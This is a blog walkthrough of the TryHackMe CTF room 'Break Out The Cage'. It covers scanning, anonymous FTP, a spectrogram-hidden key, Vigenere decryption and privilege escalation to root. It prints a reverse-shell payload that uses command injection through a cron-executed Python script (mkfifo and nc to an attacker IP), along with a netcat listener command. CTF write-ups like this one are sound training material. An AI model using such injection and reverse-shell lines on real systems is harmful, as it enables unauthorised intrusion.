---
title: "THM: Break Out The Cage"
categories: [TryHackMe]
tags: [beginner, reverse shell, cryptography, cronjobs, easy, TryHackMe]
render_with_liquid: false
media_subpath: /images/thm_breakoutthecage/
image:
  path: cage.png
---

## Room recap:
**Cage** is a TryHackMe CTF room that covers a wide variety of concepts such as the Vigenere cipher, spectrogram analysis of audio, reverse shells, path brute force, cronjobs, and more. Understanding these techniques is essential to capturing the required flags in this room.

### Room link:

[![Tryhackme](cage_room.png){: width="400" height="400" .shadow}](https://tryhackme.com/room/breakoutthecage1){: .center }

## Key Takeaways

🧠 Learned how to enumerate user privileges in Linux

💻 Practiced using tools like stat, crontab, and systemctl

## Ight. Let's do this!
We start with a port scan. The following nmap command was used to perform a detailed scan:
```console
nmap -sC -sV <room_ip>
````

The result shows several open ports:

![cage room](nmap_scan.png){: width="500" height="500" .shadow}

Among them, port 21 is running FTP and allows anonymous login.

Using anonymous access, we connect to the FTP server with:

```console
ftp <room ip>
```
and discover an interesting file:

![cage room](ftp_port.png){: width="500" height="500" .shadow}

The file is downloaded and upon inspection, it contains a long base64 string:

![cage room](dad_tasks.png){: width="800" height="800" .shadow}

I tried decoding it.

![cage room](base64decode.png){: width="600" height="600" .shadow}

Anddd there were still no readable text, which suggests that another layer of encoding or encryption is present.


To save time, I submitted the string to an online analyzer which identified it as Vigenere cipher. However, decrypting Vigenere requires a key, and at this point **no hints regarding the key were found**.

Therefore, I decided to set this aside and continue enumerating the other open ports to gather more information.

### The Website

On port 80, there's this website:

![cage room](the_website.png){: width="500" height="500" .shadow}

All the web paths appeared to be dead, so I shifted to brute forcing directories. The results revealed several accessible paths:
```console
/images
/html
/scripts
/contracts
/auditions
```
Among these, the **/auditions** directory stood out as the most promising lead. Inside it was a single audio file. 

Upon listening, the file played a short Nicolas Cage dialogue, *followed by an unusual distorted sound* layered over his voice. 

This strongly suggested the presence of hidden data embedded through a **spectrogram technique**.

### The Spectrogram
Inspecting the audio with Audacity in spectrogram view confirmed this suspicion. A concealed string appeared within the frequency spectrum, reading:

![cage room](namelesstwo.png){: width="1000" height="500" .shadow}

**"namelesstwo".**

With this newly discovered key, I revisited the Vigenere ciphertext encountered earlier. Using the string as the key successfully revealed additional information. Including **the password** for a mysterious user.

![cage room](vigenere_cipher.png){: width="1000" height="500" .shadow}

With this password in hand, I initially assumed it might belong to one of Cage’s children.
> the hint was "teach DAD..."
{: .prompt-tip }

Since I did not know their exact names, I searched on Google and found “Weston Cage".


However, to be certain about the correct username for SSH, I revisited the CTF challenge's first question and realized that simply using **weston** was the correct answer.

## Shell as W#st*n

After establishing an SSH session with the user weston using the previously obtained credentials, I navigated to his home directory to look for **user.txt flag**. However, the directory was completely empty.

![cage room](empty_weston.png){: width="500" height="300" .shadow}

Next, I tried some basic enumeration commands. Running `sudo -l` revealed that weston was allowed to execute a single binary as root:

![cage room](sudol.png){: width="1000" height="500" .shadow}

Inspecting this binary showed that it simply called the *wall utility* to broadcast a message to all logged-in users under root privileges. 

Unfortunately, the binary itself could not be modified, and path hijacking was not possible since the paths were already secured. Therefore, I set this lead aside for the moment.

### The q0ut3s 

While I was considering my next move, the shell under weston suddenly began displaying weird broadcast messages:

![cage room](broadcast_mes.png){: width="1000" height="500" .shadow}

These broadcasts originated from the user **cage**. At this point, I realized that the next step should involve enumerating files owned by cage. Using the following command:

```console
find / -user cage -ls 2>/dev/null
```

The output revealed two interesting files:

![cage room](the_files.png){: width="1000" height="500" .shadow}

#### *spread_the_quotes.py*

One of them was a Python script that opened a file named *.quotes*, selected a random entry, and then executed a system call using `os.system("wall ...")` to broadcast it. 

#### *.quotes*

The second file simply contained the list of messages that the Python script used.

### Getting there.

From here, the **attack vector** became clear. 

If I could overwrite *.quotes*, I could **inject a reverse shell payload** that would be executed by the Python script, effectively granting me a shell as cage. 

To confirm this possibility, I checked my group memberships with the `id` command and discovered that the user weston was ALSO part of the "cage" group...really Cage? 🤨

This meant I had the necessary permissions to edit the *.quotes* file and proceed with privilege escalation.

## Shell as C#g3

I proceeded to craft a payload for a reverse shell. The payload was written as follows:
```console
echo "HELLO;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ur attack IP> <ur nc port> >/tmp/f" > .quotes
```

> the "HELLO" is for the python script that extracts strings (so the script doesn't crash) and ";" is to execute a command as OS.
{: .prompt-tip }

On another terminal, I set up a listener using:
`nc -lvnp 4444`

From here, it was only a matter of waiting for the cronjob to execute the Python script.

And as expected, we successfully obtained a shell as the **cage** user.

I also enumerated the current directory using the ls command. The result revealed one file and a subdirectory:

![cage room](cage_shell.png){: width="500" height="500" .shadow}

### User flag

Upon inspecting the file Super_Duper_Checklist, I was surprised to discover what appeared to be the user flag:

![cage room](user_flag.png){: width="600" height="500" .shadow}

After that, I navigated into the *email_backup* directory, which contained three email files. 

By reviewing them one by one, I noticed that **the third email** included a very intriguing clue: a string of ciphertext.

![cage room](ciphertext.png){: width="800" height="500" .shadow}

Given the context, I hypothesized that the encryption method could be Vigenere again...

So to test this assumption, I copied the ciphertext into an online decryption tool. Naturally, I needed a key.

### The next key.

Upon closer inspection of all three emails, I observed that the word **FACE** appeared in uppercase multiple times, particularly in the third email. 

So...this strongly suggested that **FACE** could be the encryption key.

I tested this theory, and BINGOOO! The ciphertext decrypted correctly, yielding what appeared to be a password for a specific user:

![cage room](root_pass.png){: width="1000" height="500" .shadow}

At this stage, there was little doubt left. The recovered credential was indeed **the root password.**

## Shell as R007

After obtaining the root password, I had to return to the previous shell with the user weston and run the command `su root` in order to escalate privileges:

![cage room](root_shell.png){: width="500" height="500" .shadow}

From there, the process was straightforward. The only task left was to retrieve the root flag. 

### Root flag

However, it was not named root.txt, but instead *inside an email* in a directory named **email_backup**.

This directory contained two email files. After reviewing them one by one, the second email revealed the root flag:

![cage room](root_flag.png){: width="800" height="500" .shadow}

With that, the challenge was successfully completed.

YIPPPPEEEE 🥳🎆🙌

## Thoughts

This room introduced me to the usage of the wall utility and helped me practice connecting different pieces of the puzzle to build a full exploitation chain.

I even tried a different path (which obviously failed lol), but that made the process even more fun. 

Overall, it was a chill and exciting room—definitely worth the time!